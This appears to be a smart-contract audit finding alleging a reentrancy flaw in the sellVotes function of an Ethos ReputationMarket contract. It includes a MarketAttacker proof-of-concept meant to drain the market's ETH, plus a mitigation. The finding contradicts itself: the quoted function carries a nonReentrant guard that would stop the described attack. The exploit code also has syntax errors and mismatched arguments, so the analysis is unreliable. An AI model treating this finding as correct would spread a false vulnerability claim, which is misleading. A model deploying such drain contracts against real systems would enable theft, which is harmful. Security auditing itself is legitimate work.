# Reentrancy Risk Due to State Update of `marketFunds[profileId]` in the `sellVotes` function of ReputationMarket.sol Contract

### Summary

The current implementation of the `ReputationMarket` contract has a potential reentrancy vulnerability due to an incorrect order of state updates and external calls. In particular, the contract updates the `marketFunds` state variable after performing an external call via `_sendEth`. The state variable `marketFunds[profileId]` is updated after the external call, allowing an attacker to re-enter the `sellVotes` function before the state is updated, enabling multiple withdrawals with only one state update.

### Root Cause

The root cause of the reentrancy risk in the ReputationMarket contract is the improper order of state updates and external calls, which violates the Checks-Effects-Interactions (CEI) pattern. Specifically, the contract makes an external call to `_sendEth` before updating the internal state variable `marketFunds[profileId]`. This creates a vulnerability where an attacker can exploit the contract during the external call to re-enter the function before the state update is applied, leading to unexpected behavior.

[ethos/packages/contracts/contracts/ReputationMarket.sol:sellVotes#L520](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/ReputationMarket.sol#L519C1-L522C45)
```solidity
  function sellVotes(
    uint256 profileId,
    bool isPositive,
    uint256 amount
  ) public whenNotPaused activeMarket(profileId) nonReentrant {
...
    // send the proceeds to the seller
    _sendEth(fundsReceived);  // Step 1: External call made before state update
    // tally market funds
    marketFunds[profileId] -= fundsReceived; // Step 2: State updated after external call

...  
```

### Internal pre-conditions

   - `marketFunds[profileId]` must have sufficient funds.
   - The seller must have enough votes to sell.
   - The transaction amount must be reasonable.

### External pre-conditions

   - The seller's address must be valid.
   - The contract must have sufficient ETH balance.
   - Gas limits must be sufficient for execution.

### Attack Path

1. **Contract Setup:**
   - The attacker deploys the `MarketAttacker` contract and initializes it with the target `ReputationMarket` contract’s address.
   - The attacker calls the `setup()` function, purchasing some initial votes using ETH by invoking the `buyVotes()` function in `ReputationMarket`.
   
2. **Reentrancy Attack:**
   - Upon receiving the ETH transfer from the `sellVotes` function of `ReputationMarket`, the attacker’s `receive()` function is triggered.
   - In the `receive()` function, the attacker checks if the `attackCount` is less than 10 (limiting the number of re-entrancy attempts).
   - If the condition holds true, the attacker increments the `attackCount`, and recursively calls the `sellVotes()` function again, which results in the attacker withdrawing funds multiple times.
   - Each recursive call to `sellVotes` leads to the transfer of ETH to the attacker, but since the state update (decreasing the market funds) happens after the ETH transfer, the attacker is able to repeatedly withdraw funds before the market's balance is updated.

3. **Launching the Attack:**
   - The attacker launches the attack by calling the `attack()` function, which starts the reentrancy loop by invoking `sellVotes()` to trigger the initial transfer of ETH.
   - Each time the `receive()` function is triggered, the attacker calls `sellVotes()` again, thus enabling multiple withdrawals of funds from the market contract without updating the contract's state in between.

4. **Impact on Funds:**
   - The attacker is able to withdraw more ETH than the contract's actual balance because the state (i.e., the market funds) is not updated before the external call (`_sendEth()`), allowing the attacker to drain the contract’s balance.


```solidity
contract MarketAttacker {
    ReputationMarket target;
    uint256 public attackCount;
    uint256 public totalWithdrawn;
    uint256 public profileId;
    
    constructor(address _target) {
        target = ReputationMarket(_target);
    }
    
    // Initialize: Purchase some votes
    function setup() external payable {
        target.buyVotes{value: msg.value}(
            profileId,
            true,    // isPositive
            1,       // minVotesExpected
            10000    // maxSlippageBasisPoints
        );
    }
    
    // Callback function when ETH is received
    receive() external payable {
        if (attackCount < 10) {  // Limit re-entry attempts
            attackCount++;
            // Recurse into sellVotes when receiving funds
            target.sellVotes(
                profileId,
                true,    // isPositive
                1,       // votesToSell
            );
            totalWithdrawn += msg.value;
        }
    }
    
    // Launch attack
    function attack() external {
        attackCount = 0;
        target.sellVotes(
            profileId,
            true,    // isPositive
            1,       // votesToSell
        );
    }
}
```

### Impact

**Re-entrancy and Double Withdrawal:**
   ```solidity
   // Each re-entry can:
   fundsReceived = X;
   _sendEth(X);              // Sends X
   marketFunds[profileId] -= X;  // State updated last
   // This results in multiple withdrawals but only one state reduction
   ```

```

### Mitigation

The current implementation of the contract has a reentrancy risk due to the improper ordering of state updates and external calls. To mitigate this risk:

   ```solidity
   function sellVotes(...) external nonReentrant {
       // ... other logic ...
       
       // 1. Update state first
       marketFunds[profileId] -= fundsReceived;
       
       // 2. Make external call
       _sendEth(fundsReceived);
       
       // 3. Trigger event
       emit VotesSold(profileId, msg.sender, votesToSell, fundsReceived);
   }
   ```
